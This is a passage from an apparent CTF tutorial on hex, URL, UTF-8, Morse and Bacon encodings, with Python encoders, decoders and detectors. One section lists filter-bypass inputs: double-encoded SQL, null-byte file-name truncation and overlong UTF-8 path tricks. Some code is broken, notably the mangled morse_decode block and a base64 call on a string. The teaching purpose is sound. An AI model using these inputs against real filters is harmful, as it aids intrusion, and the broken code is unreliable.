    Comprehensive hex encoding/decoding operations
    """
    plaintext = b"Hello, World!"
    
    # Method 1: bytes.hex()
    hex_encoded = plaintext.hex()
    print(f"hex(): {hex_encoded}")
    
    # Method 2: binascii
    import binascii
    hex_encoded2 = binascii.hexlify(plaintext).decode()
    print(f"hexlify(): {hex_encoded2}")
    
    # Method 3: Manual formatting
    hex_encoded3 = ''.join(f'{b:02x}' for b in plaintext)
    print(f"Manual: {hex_encoded3}")
    
    # Decoding
    decoded1 = bytes.fromhex(hex_encoded)
    decoded2 = binascii.unhexlify(hex_encoded)
    
    print(f"Decoded: {decoded1}")
    
    # Hex with prefixes/separators
    print("\nHex Variants:")
    print(f"0x prefix: {' '.join('0x' + hex_encoded[i:i+2] for i in range(0, len(hex_encoded), 2))}")
    print(f"\\x prefix: {''.join('\\x' + hex_encoded[i:i+2] for i in range(0, len(hex_encoded), 2))}")
    print(f"Colon-separated: {':'.join(hex_encoded[i:i+2] for i in range(0, len(hex_encoded), 2))}")
    print(f"Space-separated: {' '.join(hex_encoded[i:i+2] for i in range(0, len(hex_encoded), 2))}")

hex_operations()
```

**Hex String Parsing:**

```python
def parse_hex_variants(hex_string):
    """
    Parse hex strings in various formats
    Handles prefixes, separators, and mixed case
    """
    import re
    
    # Remove common prefixes and separators
    cleaned = hex_string
    
    # Remove 0x prefixes
    cleaned = re.sub(r'0x', '', cleaned, flags=re.IGNORECASE)
    
    # Remove \x prefixes
    cleaned = re.sub(r'\\x', '', cleaned)
    
    # Remove separators (space, colon, dash, comma)
    cleaned = re.sub(r'[\s:,\-]', '', cleaned)
    
    # Validate hex
    if not re.match(r'^[0-9A-Fa-f]*$', cleaned):
        raise ValueError("Invalid hex string")
    
    # Decode
    try:
        decoded = bytes.fromhex(cleaned)
        return decoded
    except ValueError as e:
        raise ValueError(f"Failed to decode hex: {e}")

# Test various formats
hex_formats = [
    "48656c6c6f",
    "0x48 0x65 0x6c 0x6c 0x6f",
    "\\x48\\x65\\x6c\\x6c\\x6f",
    "48:65:6c:6c:6f",
    "48 65 6c 6c 6f",
    "48-65-6C-6C-6F",
]

print("Parsing hex variants:")
for hex_str in hex_formats:
    try:
        result = parse_hex_variants(hex_str)
        print(f"  {hex_str[:30]:30s} → {result}")
    except Exception as e:
        print(f"  {hex_str[:30]:30s} → ERROR: {e}")
```

**Hex to Various Encodings:**

```python
def hex_conversions(hex_string):
    """
    Convert hex to various representations
    """
    data = bytes.fromhex(hex_string.replace(' ', '').replace('0x', ''))
    
    conversions = {
        'Binary': ' '.join(f'{b:08b}' for b in data),
        'Decimal': ' '.join(str(b) for b in data),
        'Octal': ' '.join(f'{b:03o}' for b in data),
        'ASCII': data.decode('ascii', errors='replace'),
        'Base64': base64.b64encode(data).decode(),
        'Integer': int.from_bytes(data, 'big'),
    }
    
    return conversions

# Example
hex_data = "48656c6c6f"
results = hex_conversions(hex_data)

print("Hex conversions:")
for format_name, value in results.items():
    print(f"  {format_name:10s}: {value}")
```

**Hex Dump Format:**

```python
def hex_dump(data, width=16):
    """
    Create hexdump-style output
    Common format for binary data analysis
    """
    if isinstance(data, str):
        data = data.encode()
    
    output = []
    
    for i in range(0, len(data), width):
        chunk = data[i:i+width]
        
        # Offset
        offset = f'{i:08x}'
        
        # Hex bytes
        hex_part = ' '.join(f'{b:02x}' for b in chunk)
        hex_part = hex_part.ljust(width * 3 - 1)
        
        # ASCII representation
        ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        
        output.append(f'{offset}  {hex_part}  |{ascii_part}|')
    
    return '\n'.join(output)

# Example
data = b"Hello, World! This is a hexdump example.\n"
print(hex_dump(data))
```

### URL Encoding

URL encoding (percent-encoding) represents special characters as %XX where XX is the hexadecimal byte value.

**Basic URL Encoding:**

```python
from urllib.parse import quote, unquote, quote_plus, unquote_plus

def url_encoding_operations():
    """
    URL encoding/decoding operations
    """
    test_string = "Hello World! #special chars: @$%"
    
    # Standard URL encoding
    encoded = quote(test_string)
    print(f"quote(): {encoded}")
    
    # URL encoding with + for spaces (application/x-www-form-urlencoded)
    encoded_plus = quote_plus(test_string)
    print(f"quote_plus(): {encoded_plus}")
    
    # Decoding
    decoded = unquote(encoded)
    decoded_plus = unquote_plus(encoded_plus)
    
    print(f"unquote(): {decoded}")
    print(f"unquote_plus(): {decoded_plus}")
    
    # Safe characters (not encoded)
    print(f"\nSafe chars: {quote(test_string, safe='')}")  # Encode everything
    print(f"Custom safe: {quote(test_string, safe='! ')}")  # Keep ! and space

url_encoding_operations()
```

**Double/Triple URL Encoding:**

```python
def detect_url_encoding_layers(encoded_string):
    """
    Detect and decode multiple layers of URL encoding
    Common obfuscation technique in CTF
    """
    current = encoded_string
    layers = []
    
    while '%' in current:
        try:
            decoded = unquote(current)
            if decoded == current:
                break
            layers.append('URL decode')
            current = decoded
        except:
            break
    
    return {
        'final_result': current,
        'layers': len(layers),
        'decode_path': layers
    }

# Example: Triple URL encoding
original = "FLAG{url_encoded}"
layer1 = quote(original)
layer2 = quote(layer1)
layer3 = quote(layer2)

print(f"Triple encoded: {layer3}")

result = detect_url_encoding_layers(layer3)
print(f"Layers: {result['layers']}")
print(f"Final: {result['final_result']}")
```

**URL Encoding Variants:**

```python
def url_encoding_variants(text):
    """
    Different URL encoding representations
    """
    from urllib.parse import quote
    
    variants = {}
    
    # Standard percent encoding
    variants['Standard'] = quote(text)
    
    # Unicode encoding (%uXXXX format - deprecated but sometimes seen)
    unicode_encoded = ''.join(f'%u{ord(c):04x}' if ord(c) > 127 else c for c in text)
    variants['Unicode (%uXXXX)'] = unicode_encoded
    
    # Double encoding
    variants['Double'] = quote(quote(text))
    
    # Mixed case hex (sometimes bypasses filters)
    mixed_encoded = ''
    for c in text:
        if c == ' ':
            mixed_encoded += '%20'
        elif not c.isalnum():
            # Randomly use uppercase or lowercase hex
            hex_val = f'{ord(c):02x}'
            mixed_encoded += f'%{hex_val}'
        else:
            mixed_encoded += c
    variants['Mixed case'] = mixed_encoded
    
    return variants

test = "Hello World!"
variants = url_encoding_variants(test)

print("URL encoding variants:")
for name, encoded in variants.items():
    print(f"  {name:20s}: {encoded}")
```

**URL Encoding in CTF Contexts:**

```python
def ctf_url_tricks():
    """
    Common URL encoding tricks in CTF challenges
    """
    print("[Inference] CTF URL Encoding Tricks:\n")
    
    print("1. Filter Bypass:")
    print("   Original: SELECT * FROM users")
    print("   Encoded:  SELECT%20*%20FROM%20users")
    print("   Double:   SELECT%2520*%2520FROM%2520users")
    print("   Mixed:    %53ELECT%20*%20FROM%20users\n")
    
    print("2. Null Byte Injection:")
    print("   file.php%00.jpg → may truncate at null")
    print("   %00 = null byte\n")
    
    print("3. Unicode Normalization:")
    print("   %C0%AF → may decode to / after normalization")
    print("   %E0%80%AF → overlong UTF-8 encoding of /\n")
    
    print("4. Case Variations:")
    print("   %2f vs %2F (both valid, may bypass case-sensitive filters)\n")
    
    print("5. Plus vs %20:")
    print("   'Hello+World' vs 'Hello%20World'")
    print("   Depends on context (query string vs path)")

ctf_url_tricks()
```

**Custom URL Decoder:**

```python
import re

def advanced_url_decode(encoded_string):
    """
    Advanced URL decoder handling edge cases
    """
    decoded = encoded_string
    
    # Handle standard percent encoding
    def decode_percent(match):
        hex_val = match.group(1)
        try:
            return chr(int(hex_val, 16))
        except:
            return match.group(0)  # Return original if invalid
    
    decoded = re.sub(r'%([0-9A-Fa-f]{2})', decode_percent, decoded)
    
    # Handle %uXXXX unicode encoding (deprecated)
    def decode_unicode(match):
        hex_val = match.group(1)
        try:
            return chr(int(hex_val, 16))
        except:
            return match.group(0)
    
    decoded = re.sub(r'%u([0-9A-Fa-f]{4})', decode_unicode, decoded)
    
    # Handle + as space (application/x-www-form-urlencoded)
    # Only if not in path context
    decoded = decoded.replace('+', ' ')
    
    return decoded

# Test
test_cases = [
    "Hello%20World",
    "Test%2BSign",
    "%48%65%6c%6c%6f",
    "%u0048%u0065%u006c%u006c%u006f",
]

print("Advanced URL decoding:")
for test in test_cases:
    print(f"  {test:30s} → {advanced_url_decode(test)}")
```

### ASCII/UTF-8

ASCII and UTF-8 encoding for character representation and conversion.

**ASCII Operations:**

```python
def ascii_operations():
    """
    ASCII encoding operations and conversions
    """
    text = "Hello"
    
    # String to ASCII values
    ascii_values = [ord(c) for c in text]
    print(f"ASCII values: {ascii_values}")
    
    # ASCII to string
    reconstructed = ''.join(chr(val) for val in ascii_values)
    print(f"Reconstructed: {reconstructed}")
    
    # ASCII ranges
    print("\nASCII Ranges:")
    print(f"  0-31: Control characters")
    print(f"  32-126: Printable characters")
    print(f"  48-57: Digits (0-9)")
    print(f"  65-90: Uppercase (A-Z)")
    print(f"  97-122: Lowercase (a-z)")
    
    # Check if string is ASCII
    test_strings = ["Hello", "Héllo", "こんにちは"]
    for s in test_strings:
        is_ascii = all(ord(c) < 128 for c in s)
        print(f"  '{s}' is ASCII: {is_ascii}")

ascii_operations()
```

**UTF-8 Operations:**

```python
def utf8_operations():
    """
    UTF-8 encoding operations
    """
    text = "Hello 世界 🌍"
    
    # Encode to UTF-8 bytes
    utf8_bytes = text.encode('utf-8')
    print(f"UTF-8 bytes: {utf8_bytes}")
    print(f"Hex: {utf8_bytes.hex()}")
    
    # Decode from UTF-8
    decoded = utf8_bytes.decode('utf-8')
    print(f"Decoded: {decoded}")
    
    # UTF-8 byte structure
    print("\nUTF-8 Encoding:")
    for char in text:
        encoded = char.encode('utf-8')
        codepoint = ord(char)
        print(f"  '{char}' (U+{codepoint:04X}): {encoded.hex()} ({len(encoded)} bytes)")
    
    # Handle encoding errors
    invalid_utf8 = b'\xff\xfe\xfd'
    try:
        decoded_strict = invalid_utf8.decode('utf-8')
    except UnicodeDecodeError as e:
        print(f"\nStrict decode error: {e}")
    
    # Error handling modes
    decoded_replace = invalid_utf8.decode('utf-8', errors='replace')
    decoded_ignore = invalid_utf8.decode('utf-8', errors='ignore')
    
    print(f"Replace mode: {decoded_replace}")
    print(f"Ignore mode: {decoded_ignore}")

utf8_operations()
```

**Character Encoding Detection:**

```python
def detect_character_encoding(data):
    """
    Attempt to detect character encoding
    [Inference] Based on byte patterns
    """
    if isinstance(data, str):
        data = data.encode('latin1')  # Preserve bytes
    
    encodings_to_try = ['utf-8', 'utf-16', 'utf-16-le', 'utf-16-be', 
                        'latin1', 'cp1252', 'ascii']
    
    results = []
    
    for encoding in encodings_to_try:
        try:
            decoded = data.decode(encoding)
            # Check if result is printable
            printable_ratio = sum(c.isprintable() or c.isspace() for c in decoded) / len(decoded)
            
            results.append({
                'encoding': encoding,
                'decoded': decoded,
                'printable_ratio': printable_ratio,
                'confidence': 'HIGH' if printable_ratio > 0.95 else 
                             'MEDIUM' if printable_ratio > 0.80 else 'LOW'
            })
        except:
            continue
    
    return sorted(results, key=lambda x: x['printable_ratio'], reverse=True)

# Test
test_data = "Hello, World!".encode('utf-8')
results = detect_character_encoding(test_data)

print("Encoding detection results:")
for result in results[:3]:  # Top 3
    print(f"  {result['encoding']:10s}: {result['confidence']:6s} ({result['printable_ratio']:.2%} printable)")
```

**ASCII Art and Special Characters:**

```python
def ascii_conversions():
    """
    Various ASCII representations
    """
    text = "CTF"
    
    print("ASCII Representations:\n")
    
    # Decimal
    decimal = ' '.join(str(ord(c)) for c in text)
    print(f"Decimal: {decimal}")
    
    # Hexadecimal
    hex_repr = ' '.join(f'0x{ord(c):02x}' for c in text)
    print(f"Hex: {hex_repr}")
    
    # Binary
    binary = ' '.join(f'{ord(c):08b}' for c in text)
    print(f"Binary: {binary}")
    
    # Octal
    octal = ' '.join(f'{ord(c):03o}' for c in text)
    print(f"Octal: {octal}")
    
    # HTML entities
    html_decimal = ''.join(f'&#{ord(c)};' for c in text)
    html_hex = ''.join(f'&#x{ord(c):02x};' for c in text)
    print(f"HTML (decimal): {html_decimal}")
    print(f"HTML (hex): {html_hex}")
    
    # Python string literal
    python_literal = repr(text)
    print(f"Python literal: {python_literal}")

ascii_conversions()
```

### Morse Code

Morse code represents characters as sequences of dots (.) and dashes (-).

**Morse Code Implementation:**

```python
# Standard International Morse Code
MORSE_CODE = {
    'A': '.-',    'B': '-...',  'C': '-.-.',  'D': '-..',   'E': '.',
    'F': '..-.',  'G': '--.',   'H': '....',  'I': '..',    'J': '.---',
    'K': '-.-',   'L': '.-..',  'M': '--',    'N': '-.',    'O': '---',
    'P': '.--.',  'Q': '--.-',  'R': '.-.',   'S': '...',   'T': '-',
    'U': '..-',   'V': '...-',  'W': '.--',   'X': '-..-',  'Y': '-.--',
    'Z': '--..',
    '0': '-----', '1': '.----', '2': '..---', '3': '...--', '4': '....-',
    '5': '.....', '6': '-....', '7': '--...', '8': '---..', '9': '----.',
    '.': '.-.-.-', ',': '--..--', '?': '..--..', "'": '.----.',
    '!': '-.-.--', '/': '-..-.', '(': '-.--.', ')': '-.--.-',
    '&': '.-...', ':': '---...', ';': '-.-.-.', '=': '-...-',
    '+': '.-.-.', '-': '-....-', '_': '..--.-', '"': '.-..-.',
    '$': '...-..-', '@': '.--.-.', ' ': '/'
}

# Reverse dictionary for decoding
MORSE_DECODE = {v: k for k, v in MORSE_CODE.items()}

def morse_encode(text):
    """
    Encode text to Morse code
    """
    text = text.upper()
    encoded = []
    
    for char in text:
        if char in MORSE_CODE:
            encoded.append(MORSE_CODE[char])
        elif char == ' ':
            encoded.append('/')  # Word separator
        else:
            encoded.append('?')  # Unknown character
    
    return ' '.join(encoded)

def morse_decode(morse):
    """
    Decode Morse code to text
    """
    # Split by spaces
    morse_chars = morse.split(' ')

decoded = []

for morse_char in morse_chars:
    if morse_char in MORSE_DECODE:
        decoded.append(MORSE_DECODE[morse_char])
    elif morse_char == '/' or morse_char == '':
        decoded.append(' ')
    else:
        decoded.append('?')  # Unknown Morse character

return ''.join(decoded)

# Example usage

plaintext = "HELLO WORLD" morse = morse_encode(plaintext) decoded = morse_decode(morse)

print(f"Original: {plaintext}") print(f"Morse: {morse}") print(f"Decoded: {decoded}")
````

**Morse Code Variants:**

```python
def morse_variants():
    """
    Handle different Morse code representations
    """
    text = "SOS"
    standard_morse = morse_encode(text)
    
    variants = {
        'Standard (. -)': standard_morse,
        'Binary (0 1)': standard_morse.replace('.', '0').replace('-', '1'),
        'Audio (dit dah)': standard_morse.replace('.', 'dit').replace('-', 'dah'),
        'Visual (● ▬)': standard_morse.replace('.', '●').replace('-', '▬'),
        'Compact (no spaces)': standard_morse.replace(' ', ''),
        'Word separator (/)': standard_morse.replace(' / ', ' / '),
    }
    
    print(f"Text: {text}\n")
    for name, encoded in variants.items():
        print(f"{name:20s}: {encoded}")

morse_variants()
````

**Morse Code Parser (Flexible):**

```python
import re

def parse_morse_flexible(morse_string):
    """
    Parse Morse code with flexible formatting
    Handles various separators and representations
    """
    # Normalize input
    normalized = morse_string
    
    # Convert binary to dots/dashes
    if re.match(r'^[01\s/]+$', normalized):
        normalized = normalized.replace('0', '.').replace('1', '-')
    
    # Convert dit/dah to dots/dashes
    normalized = normalized.replace('dit', '.').replace('dah', '-')
    
    # Convert visual symbols
    normalized = normalized.replace('●', '.').replace('▬', '-')
    normalized = normalized.replace('•', '.').replace('—', '-')
    
    # Normalize separators
    # Try to detect word separators
    if '/' in normalized:
        # / is word separator
        pass
    elif '   ' in normalized:  # 3 spaces
        normalized = normalized.replace('   ', ' / ')
    
    # Ensure single space between characters
    normalized = re.sub(r'\s+', ' ', normalized)
    normalized = normalized.strip()
    
    # Decode
    try:
        decoded = morse_decode(normalized)
        return {
            'success': True,
            'decoded': decoded,
            'normalized': normalized
        }
    except Exception as e:
        return {
            'success': False,
            'error': str(e),
            'normalized': normalized
        }

# Test various formats
test_cases = [
    ".... . .-.. .-.. --- / .-- --- .-. .-.. -..",
    "01001010010010100111011101110111011101110",  # Binary
    "dit dit dit dit / dit / dit dah dit dit / dit dah dit dit / dah dah dah",
    "●●●● ● ●▬●● ●▬●● ▬▬▬ / ▬▬▬ ▬▬▬ ▬●▬ ▬●▬ ●●",
]

print("Flexible Morse parsing:")
for test in test_cases:
    result = parse_morse_flexible(test)
    if result['success']:
        print(f"  Decoded: {result['decoded']}")
    else:
        print(f"  Error: {result['error']}")
```

**Morse Code Audio Generation (Conceptual):**

```python
def morse_to_audio_info():
    """
    Information about Morse code audio characteristics
    [Unverified] Actual audio generation requires sound libraries
    """
    print("[Inference] Morse Code Audio Characteristics:\n")
    
    print("Timing (using dit as unit):")
    print("  - Dot (dit): 1 unit")
    print("  - Dash (dah): 3 units")
    print("  - Gap between symbols: 1 unit")
    print("  - Gap between letters: 3 units")
    print("  - Gap between words: 7 units")
    
    print("\nStandard Frequencies:")
    print("  - CW (Continuous Wave): 600-800 Hz")
    print("  - Amateur Radio: 700-800 Hz")
    print("  - Military: 1000 Hz")
    
    print("\nSpeed (WPM - Words Per Minute):")
    print("  - Beginner: 5-10 WPM")
    print("  - Standard: 12-20 WPM")
    print("  - High Speed: 25-40 WPM")
    print("  - Professional: 40+ WPM")
    
    print("\n[Example] Generate using libraries:")
    print("  - numpy + scipy for waveform")
    print("  - pydub for audio file creation")
    print("  - pygame for playback")

morse_to_audio_info()
```

**Morse Code CTF Recognition:**

```python
def identify_morse_code(data):
    """
    Detect if data is Morse code
    [Inference] Based on character patterns
    """
    if isinstance(data, bytes):
        data = data.decode('ascii', errors='ignore')
    
    indicators = []
    confidence = 0
    
    # Check for Morse characters
    morse_chars = set('.-/')
    data_chars = set(data.replace(' ', ''))
    
    if data_chars.issubset(morse_chars):
        indicators.append("Contains only Morse characters (.-/)")
        confidence += 40
    
    # Check for binary representation
    if re.match(r'^[01\s/]+$', data):
        indicators.append("Binary format (0s and 1s)")
        confidence += 20
    
    # Check for dit/dah
    if 'dit' in data.lower() or 'dah' in data.lower():
        indicators.append("Audio representation (dit/dah)")
        confidence += 40
    
    # Check for typical Morse patterns
    if re.search(r'\.\.\.|---', data):  # SOS pattern
        indicators.append("Contains SOS pattern (...---...)")
        confidence += 30
    
    # Check spacing patterns
    if ' / ' in data:
        indicators.append("Word separator (/) present")
        confidence += 20
    
    # Check length patterns
    tokens = data.split()
    if tokens:
        avg_length = sum(len(t) for t in tokens) / len(tokens)
        if 1 <= avg_length <= 6:  # Typical Morse character length
            indicators.append(f"Average token length ({avg_length:.1f}) matches Morse")
            confidence += 10
    
    return {
        'is_morse': confidence >= 30,
        'confidence': min(confidence, 100),
        'indicators': indicators
    }

# Test detection
test_strings = [
    ".... . .-.. .-.. ---",
    "01001010010010100111",
    "dit dit dah dit",
    "Hello World",
    "... --- ...",
]

print("Morse code detection:")
for test in test_strings:
    result = identify_morse_code(test)
    status = "✓" if result['is_morse'] else "✗"
    print(f"{status} '{test[:30]}': {result['confidence']}% confidence")
    if result['indicators']:
        for indicator in result['indicators'][:2]:
            print(f"    - {indicator}")
```

### Bacon Cipher (5-bit)

The Bacon cipher encodes each letter as a 5-bit binary sequence using only two symbols (traditionally A and B, or 0 and 1).

**Bacon Cipher Implementation:**

```python
# Bacon cipher encoding table (original)
BACON_ORIGINAL = {
    'A': 'AAAAA', 'B': 'AAAAB', 'C': 'AAABA', 'D': 'AAABB', 'E': 'AABAA',
    'F': 'AABAB', 'G': 'AABBA', 'H': 'AABBB', 'I': 'ABAAA', 'J': 'ABAAA',  # I/J same
    'K': 'ABAAB', 'L': 'ABABA', 'M': 'ABABB', 'N': 'ABBAA', 'O': 'ABBAB',
    'P': 'ABBBA', 'Q': 'ABBBB', 'R': 'BAAAA', 'S': 'BAAAB', 'T': 'BAABA',
    'U': 'BAABB', 'V': 'BAABB',  # U/V same
    'W': 'BABAA', 'X': 'BABAB', 'Y': 'BABBA', 'Z': 'BABBB'
}

# Modern variant (26 distinct letters)
BACON_MODERN = {
    'A': 'AAAAA', 'B': 'AAAAB', 'C': 'AAABA', 'D': 'AAABB', 'E': 'AABAA',
    'F': 'AABAB', 'G': 'AABBA', 'H': 'AABBB', 'I': 'ABAAA', 'J': 'ABAAB',
    'K': 'ABABA', 'L': 'ABABB', 'M': 'ABBAA', 'N': 'ABBAB', 'O': 'ABBBA',
    'P': 'ABBBB', 'Q': 'BAAAA', 'R': 'BAAAB', 'S': 'BAABA', 'T': 'BAABB',
    'U': 'BABAA', 'V': 'BABAB', 'W': 'BABBA', 'X': 'BABBB', 'Y': 'BBAAA',
    'Z': 'BBAAB'
}

def bacon_encode(text, variant='modern'):
    """
    Encode text using Bacon cipher
    """
    table = BACON_MODERN if variant == 'modern' else BACON_ORIGINAL
    text = text.upper()
    
    encoded = []
    for char in text:
        if char in table:
            encoded.append(table[char])
        elif char == ' ':
            encoded.append(' ')  # Preserve spaces
    
    return ''.join(encoded)

def bacon_decode(bacon_text, variant='modern'):
    """
    Decode Bacon cipher
    """
    table = BACON_MODERN if variant == 'modern' else BACON_ORIGINAL
    # Create reverse mapping
    reverse_table = {v: k for k, v in table.items()}
    
    # Normalize to A/B
    bacon_text = bacon_text.upper()
    bacon_text = bacon_text.replace('0', 'A').replace('1', 'B')
    
    decoded = []
    i = 0
    
    while i < len(bacon_text):
        if bacon_text[i] == ' ':
            decoded.append(' ')
            i += 1
            continue
        
        # Extract 5-character group
        group = bacon_text[i:i+5]
        if len(group) == 5 and group in reverse_table:
            decoded.append(reverse_table[group])
            i += 5
        else:
            decoded.append('?')
            i += 1
    
    return ''.join(decoded)

# Example
plaintext = "HELLO"
encoded = bacon_encode(plaintext)
decoded = bacon_decode(encoded)

print(f"Original: {plaintext}")
print(f"Bacon: {encoded}")
print(f"Decoded: {decoded}")
```

**Bacon Cipher with Steganography:**

```python
def bacon_steganography_encode(plaintext, cover_text):
    """
    Encode message in Bacon cipher hidden in cover text
    Uses typography (bold/italic, case, fonts) to encode A/B
    
    Simplified: uppercase = B, lowercase = A
    """
    bacon = bacon_encode(plaintext).replace(' ', '')
    
    if len(cover_text) < len(bacon):
        raise ValueError("Cover text too short")
    
    encoded_text = []
    bacon_index = 0
    
    for char in cover_text:
        if not char.isalpha():
            encoded_text.append(char)
            continue
        
        if bacon_index < len(bacon):
            if bacon[bacon_index] == 'A':
                encoded_text.append(char.lower())
            else:  # 'B'
                encoded_text.append(char.upper())
            bacon_index += 1
        else:
            encoded_text.append(char)
    
    return ''.join(encoded_text)

def bacon_steganography_decode(encoded_text, variant='modern'):
    """
    Decode Bacon cipher from steganographic text
    Extracts A/B pattern from case
    """
    pattern = []
    
    for char in encoded_text:
        if char.isalpha():
            if char.islower():
                pattern.append('A')
            else:
                pattern.append('B')
    
    bacon_string = ''.join(pattern)
    return bacon_decode(bacon_string, variant)

# Example
message = "HIDE"
cover = "the quick brown fox jumps over the lazy dog and runs away"
stego = bacon_steganography_encode(message, cover)
recovered = bacon_steganography_decode(stego)

print(f"Message: {message}")
print(f"Cover: {cover}")
print(f"Stego: {stego}")
print(f"Recovered: {recovered}")
```

**Bacon Cipher Variants:**

```python
def bacon_variants():
    """
    Different representations of Bacon cipher
    """
    text = "CTF"
    bacon = bacon_encode(text)
    
    variants = {
        'Standard (A/B)': bacon,
        'Binary (0/1)': bacon.replace('A', '0').replace('B', '1'),
        'Dots/Dashes': bacon.replace('A', '.').replace('B', '-'),
        'Visual (○/●)': bacon.replace('A', '○').replace('B', '●'),
        'Case (a/A)': bacon.replace('A', 'a').replace('B', 'A'),
        'Typography': bacon.replace('A', 'normal').replace('B', 'BOLD'),
    }
    
    print(f"Text: {text}\n")
    for name, encoded in variants.items():
        print(f"{name:20s}: {encoded}")

bacon_variants()
```

**Bacon Cipher Detection:**

```python
def detect_bacon_cipher(text):
    """
    Detect if text contains Bacon cipher
    [Inference] Based on patterns and structure
    """
    indicators = []
    confidence = 0
    
    # Remove spaces and normalize
    cleaned = text.replace(' ', '').upper()
    
    # Check for A/B only
    if set(cleaned).issubset({'A', 'B'}):
        indicators.append("Contains only A and B")
        confidence += 30
    
    # Check for binary
    if set(cleaned).issubset({'0', '1'}):
        indicators.append("Binary format (could be Bacon)")
        confidence += 20
    
    # Check length (multiple of 5)
    if len(cleaned) % 5 == 0:
        indicators.append(f"Length ({len(cleaned)}) is multiple of 5")
        confidence += 30
    
    # Check for steganographic pattern
    if text != text.lower() and text != text.upper():
        # Mixed case
        case_pattern = ''.join('B' if c.isupper() else 'A' for c in text if c.isalpha())
        if len(case_pattern) % 5 == 0 and len(case_pattern) >= 5:
            indicators.append("Mixed case pattern (steganographic Bacon)")
            confidence += 40
    
    # Try decoding
    try:
        if len(cleaned) >= 5 and len(cleaned) % 5 == 0:
            decoded = bacon_decode(cleaned)
            if decoded and decoded != '?' * len(decoded):
                indicators.append(f"Successfully decodes to: {decoded[:20]}")
                confidence += 30
    except:
        pass
    
    return {
        'is_bacon': confidence >= 40,
        'confidence': min(confidence, 100),
        'indicators': indicators
    }

# Test detection
test_cases = [
    "AABBBAABAABABBBAABAABABBAA",
    "00111001000111100100101100",
    "ThE qUIcK BrOWn FoX",
    "HELLO WORLD",
]

print("Bacon cipher detection:")
for test in test_cases:
    result = detect_bacon_cipher(test)
    status = "✓" if result['is_bacon'] else "✗"
    print(f"\n{status} '{test[:40]}'")
    print(f"   Confidence: {result['confidence']}%")
    for indicator in result['indicators']:
        print(f"   - {indicator}")
```

**Complete Encoding Chain Analyzer:**

```python
def analyze_encoding_chain(data):
    """
    Analyze and attempt to decode multi-layer encoding
    [Inference] Tries multiple encoding schemes automatically
    """
    if isinstance(data, bytes):
        data = data.decode('ascii', errors='ignore')
    
    results = {
        'original': data,
        'detected_encodings': [],
        'decode_attempts': []
    }
    
    # Detect all possible encodings
    checks = [
        ('Base64', detect_base_encoding),
        ('URL Encoding', lambda d: [{'encoding': 'URL', 'confidence': 'HIGH'}] if '%' in d else []),
        ('Hex', lambda d: [{'encoding': 'Hex', 'confidence': 'HIGH'}] if re.match(r'^[0-9A-Fa-f\s]+$', d.replace('0x', '')) else []),
        ('Morse', identify_morse_code),
        ('Bacon', detect_bacon_cipher),
    ]
    
    for name, detector in checks:
        try:
            result = detector(data)
            if result:
                if isinstance(result, list):
                    results['detected_encodings'].extend(result)
                elif isinstance(result, dict):
                    if result.get('is_morse') or result.get('is_bacon'):
                        results['detected_encodings'].append({
                            'encoding': name,
                            'confidence': f"{result.get('confidence', 0)}%"
                        })
        except:
            continue
    
    # Try decoding with each detected encoding
    for detection in results['detected_encodings']:
        encoding = detection.get('encoding', '')
        
        try:
            decoded = None
            
            if 'Base64' in encoding:
                decoded = base64.b64decode(data)
            elif encoding == 'URL':
                decoded = unquote(data)
            elif encoding == 'Hex':
                cleaned = data.replace(' ', '').replace('0x', '')
                decoded = bytes.fromhex(cleaned)
            elif encoding == 'Morse':
                decoded = morse_decode(data)
            elif encoding == 'Bacon':
                decoded = bacon_decode(data)
            
            if decoded:
                results['decode_attempts'].append({
                    'encoding': encoding,
                    'result': decoded[:100] if isinstance(decoded, (str, bytes)) else str(decoded)[:100]
                })
        except Exception as e:
            results['decode_attempts'].append({
                'encoding': encoding,
                'result': f"Error: {str(e)[:50]}"
            })
    
    return results

# Example
test_data = base64.b64encode(b"FLAG{hidden_message}").decode()
analysis = analyze_encoding_chain(test_data)

print("Encoding Analysis:")
print(f"Original: {analysis['original'][:60]}\n")

print("Detected Encodings:")
for enc in analysis['detected_encodings']:
    print(f"  - {enc['encoding']}: {enc.get('confidence', 'N/A')}")

print("\nDecode Attempts:")
for attempt in analysis['decode_attempts']:
    print(f"  [{attempt['encoding']}] {attempt['result']}")
```

**CTF Encoding Toolkit:**

```python
class EncodingToolkit:
    """
    Comprehensive encoding toolkit for CTF challenges
    """
    
    def __init__(self):
        self.decode_functions = {
            'base64': base64.b64decode,
            'base32': base64.b32decode,
            'base16': base64.b16decode,
            'hex': bytes.fromhex,
            'url': unquote,
            'morse': morse_decode,
            'bacon': bacon_decode,
        }
    
    def auto_decode(self, data, max_iterations=10):
        """
        Automatically detect and decode multiple layers
        """
        current = data
        decode_path = []
        iteration = 0
        
        while iteration < max_iterations:
            # Convert bytes to string if needed
            if isinstance(current, bytes):
                try:
                    current = current.decode('ascii')
                except:
                    break
            
            # Detect encoding
            detected = self.detect_encoding(current)
            
            if not detected:
                break
            
            # Try decoding
            success = False
            for encoding_name in detected:
                try:
                    if encoding_name == 'hex':
                        cleaned = current.replace(' ', '').replace('0x', '')
                        decoded = bytes.fromhex(cleaned)
                    elif encoding_name in self.decode_functions:
                        decoder = self.decode_functions[encoding_name]
                        decoded = decoder(current)
                    else:
                        continue
                    
                    if decoded != current and decoded != current.encode():
                        decode_path.append(encoding_name)
                        current = decoded
                        iteration += 1
                        success = True
                        break
                except:
                    continue
            
            if not success:
                break
        
        return {
            'result': current,
            'path': decode_path,
            'iterations': iteration
        }
    
    def detect_encoding(self, data):
        """Simple encoding detection"""
        encodings = []
        
        if isinstance(data, bytes):
            data = data.decode('ascii', errors='ignore')
        
        # Base64
        if re.match(r'^[A-Za-z0-9+/]*={0,2}$', data) and len(data) % 4 == 0:
            encodings.append('base64')
        
        # Hex
        if re.match(r'^[0-9A-Fa-f\s]+$', data.replace('0x', '')):
            encodings.append('hex')
        
        # URL
        if '%' in data:
            encodings.append('url')
        
        # Morse
        if set(data.replace(' ', '')).issubset({'.', '-', '/'}):
            encodings.append('morse')
        
        # Bacon
        if set(data.replace(' ', '')).issubset({'A', 'B'}):
            encodings.append('bacon')
        
        return encodings

# Example usage
toolkit = EncodingToolkit()

# Multi-layer encoded data
original = b"FLAG{multi_layer}"
layer1 = base64.b64encode(original)
layer2 = layer1.hex()
layer3 = base64.b64encode(layer2)

print(f"Encoded (3 layers): {layer3}\n")

result = toolkit.auto_decode(layer3)
print(f"Decode path: {' -> '.join(result['path'])}")
print(f"Iterations: {result['iterations']}")
print(f"Final result: {result['result']}")
```

---

**Key Takeaways for CTF:**

